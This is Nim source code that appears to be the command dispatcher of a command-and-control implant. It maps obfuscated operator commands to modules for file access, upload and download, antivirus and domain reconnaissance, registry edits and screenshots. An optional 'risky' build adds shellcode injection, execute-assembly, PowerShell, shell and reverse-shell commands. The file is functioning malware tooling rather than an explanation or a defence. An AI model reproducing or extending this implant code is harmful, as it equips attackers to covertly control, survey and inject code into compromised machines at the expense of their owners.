import parsetoml, strutils, tables
from ../util/crypto import xorStringToByteSeq, xorByteSeqToString
from ../core/webClientListener import Listener

# Filesystem operations
include ../modules/filesystem/[cat, cd, cp, ls, mkdir, mv, pwd, rm]

# Network operations
include ../modules/network/[curl, download, upload, wget]

# System information and operations
include ../modules/system/[env, getAv, getDom, getLocalAdm, ps, whoami]

# Registry operations
include ../modules/regedit/[reg]

# Execution operations
include ../modules/execution/[run]

# Screenshot operations
include ../modules/screenshot/[screenshot]

# Risky commands (already existing)
when defined risky:
    include ../modules/risky/[executeAssembly, inlineExecute, powershell, shell, shinject, reverseShell]

type
  CommandDispatch = object
    cmd: string
    handlerEmpty: proc(): string {.nimcall.}
    handler: proc(args: seq[string]): string {.nimcall.}
    handlerWithListener: proc(li: Listener, args: seq[string]): string {.nimcall.}
    handlerWithListenerAndGuid: proc(li: Listener, cmdGuid: string, args: seq[string]): string {.nimcall.}

var dispatcher = {
  obf("cat"): CommandDispatch(handler: cat),
  obf("cd"): CommandDispatch(handler: cd),
  obf("cp"): CommandDispatch(handler: cp),
  obf("curl"): CommandDispatch(handlerWithListener: curl),
  obf("download"): CommandDispatch(handlerWithListenerAndGuid: download),
  obf("env"): CommandDispatch(handlerEmpty: env),
  obf("getav"): CommandDispatch(handlerEmpty: getAv),
  obf("getdom"): CommandDispatch(handlerEmpty: getDom),
  obf("getlocaladm"): CommandDispatch(handlerEmpty: getLocalAdm),
  obf("ls"): CommandDispatch(handler: ls),
  obf("mkdir"): CommandDispatch(handler: mkdir),
  obf("mv"): CommandDispatch(handler: mv),
  obf("ps"): CommandDispatch(handlerEmpty: ps),
  obf("pwd"): CommandDispatch(handlerEmpty: pwd),
  obf("reg"): CommandDispatch(handler: reg),
  obf("rm"): CommandDispatch(handler: rm),
  obf("run"): CommandDispatch(handler: run),
  obf("screenshot"): CommandDispatch(handler: screenshot),
  obf("upload"): CommandDispatch(handlerWithListenerAndGuid: upload),
  obf("wget"): CommandDispatch(handlerWithListener: wget),
  obf("whoami"): CommandDispatch(handlerEmpty: whoami)
}.toTable

# Parse user commands that do not affect the listener object here
proc parseCmd*(li : Listener, cmd : string, cmdGuid : string, args : seq[string]) : string =

    try:
        # Parse the received command
        let dispatch = dispatcher.getOrDefault(cmd, CommandDispatch())
        if dispatch.handlerWithListenerAndGuid != nil:
            return dispatch.handlerWithListenerAndGuid(li, cmdGuid, args)
        elif dispatch.handlerWithListener != nil:
            return dispatch.handlerWithListener(li, args)
        elif dispatch.handler != nil:
            return dispatch.handler(args)
        else:
            # Parse risky commands, if enabled
            when defined risky:
                if cmd == obf("execute-assembly"):
                    result = executeAssembly(li, args)
                elif cmd == obf("inline-execute"):
                    result = inlineExecute(li, args)
                elif cmd == obf("powershell"):
                    result = powershell(args)
                elif cmd == obf("shell"):
                    result = shell(args)
                elif cmd == obf("shinject"):
                    result = shinject(li, args)
                elif cmd == obf("reverse-shell"):
                    result = reverseShell(args)
                else:
                    result = obf("ERROR: An unknown command was received.")
            else:
                result = obf("ERROR: An unknown command was received.")
    
    # Catch unhandled exceptions during command execution (commonly OS exceptions)
    except:
        let
            msg = getCurrentExceptionMsg()

        result = obf("ERROR: An unhandled exception occurred.\nException: ") & msg